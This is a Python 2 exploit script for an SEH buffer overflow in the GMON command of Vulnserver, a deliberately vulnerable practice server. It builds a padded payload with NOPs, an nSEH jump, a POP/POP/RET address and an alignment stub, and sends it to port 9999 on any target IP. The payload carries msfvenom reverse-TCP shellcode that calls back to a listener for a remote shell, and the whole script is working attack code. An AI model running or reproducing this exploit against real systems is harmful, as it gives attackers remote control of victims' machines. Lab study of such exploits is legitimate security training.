# Author	: RIZAL MUHAMMED [UB3RSiCK]
# Desc.		: Steve Bradshaw's Vulnserver Buffer Overflow [GMON Command], SEH
# OS		: Windows Vista ULTIMATE x86 SP2
# Date		: 09/03/2018

import sys
import struct
from socket import create_connection as cc

def p(a):
	return struct.pack("I", a)

if len(sys.argv) < 2:
	print 'Usage : {} TARGET_IP'.format(sys.argv[0])
	sys.exit()

host = str(sys.argv[1])
port = 9999

try:
	sock = cc((host, port))
except:
	print "Connection Error\n"
	sys.exit()

# Grab the banner
banner = sock.recv(1024)
print "Connected to ", host
print banner

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.130 LPORT=443 -f c -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
shellcode = ("\xba\xa6\xc7\xbb\x2c\xdb\xcc\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x31\x53\x12\x03\x53\x12\x83\x65\xc3\x59\xd9\x95\x24\x1f"
"\x22\x65\xb5\x40\xaa\x80\x84\x40\xc8\xc1\xb7\x70\x9a\x87\x3b"
"\xfa\xce\x33\xcf\x8e\xc6\x34\x78\x24\x31\x7b\x79\x15\x01\x1a"
"\xf9\x64\x56\xfc\xc0\xa6\xab\xfd\x05\xda\x46\xaf\xde\x90\xf5"
"\x5f\x6a\xec\xc5\xd4\x20\xe0\x4d\x09\xf0\x03\x7f\x9c\x8a\x5d"
"\x5f\x1f\x5e\xd6\xd6\x07\x83\xd3\xa1\xbc\x77\xaf\x33\x14\x46"
"\x50\x9f\x59\x66\xa3\xe1\x9e\x41\x5c\x94\xd6\xb1\xe1\xaf\x2d"
"\xcb\x3d\x25\xb5\x6b\xb5\x9d\x11\x8d\x1a\x7b\xd2\x81\xd7\x0f"
"\xbc\x85\xe6\xdc\xb7\xb2\x63\xe3\x17\x33\x37\xc0\xb3\x1f\xe3"
"\x69\xe2\xc5\x42\x95\xf4\xa5\x3b\x33\x7f\x4b\x2f\x4e\x22\x04"
"\x9c\x63\xdc\xd4\x8a\xf4\xaf\xe6\x15\xaf\x27\x4b\xdd\x69\xb0"
"\xac\xf4\xce\x2e\x53\xf7\x2e\x67\x90\xa3\x7e\x1f\x31\xcc\x14"
"\xdf\xbe\x19\xba\x8f\x10\xf2\x7b\x7f\xd1\xa2\x13\x95\xde\x9d"
"\x04\x96\x34\xb6\xaf\x6d\xdf\x79\x87\x6e\x9d\x12\xda\x70\xa0"
"\x59\x53\x96\xc8\x8d\x32\x01\x65\x37\x1f\xd9\x14\xb8\xb5\xa4"
"\x17\x32\x3a\x59\xd9\xb3\x37\x49\x8e\x33\x02\x33\x19\x4b\xb8"
"\x5b\xc5\xde\x27\x9b\x80\xc2\xff\xcc\xc5\x35\xf6\x98\xfb\x6c"
"\xa0\xbe\x01\xe8\x8b\x7a\xde\xc9\x12\x83\x93\x76\x31\x93\x6d"
"\x76\x7d\xc7\x21\x21\x2b\xb1\x87\x9b\x9d\x6b\x5e\x77\x74\xfb"
"\x27\xbb\x47\x7d\x28\x96\x31\x61\x99\x4f\x04\x9e\x16\x18\x80"
"\xe7\x4a\xb8\x6f\x32\xcf\xc8\x25\x1e\x66\x41\xe0\xcb\x3a\x0c"
"\x13\x26\x78\x29\x90\xc2\x01\xce\x88\xa7\x04\x8a\x0e\x54\x75"
"\x83\xfa\x5a\x2a\xa4\x2e")

payload = "GMON /.:/"

SEH = p(0x625010B4)
nSEH = "\xEB\x06\x90\x90"

#ALIGN EAX TO BUFFER AND JUMP TO IT
"""
00DDFFD0   54               PUSH ESP
00DDFFD1   58               POP EAX
00DDFFD2   66:05 E503       ADD AX,3E5
00DDFFD6  ^FFE0             JMP EAX
"""
jmpeax = "\x54\x58\x66\x05\xE5\x03\xFF\xE0"
nops = "\x90"
payload += nops * 16 + shellcode + "A"*(3515-len(shellcode)-16) + nSEH + SEH + nops * 4 + jmpeax + "C"*(500-len(jmpeax))

print "[*] Sending UB3R payload ph33r..."
sock.send(payload)
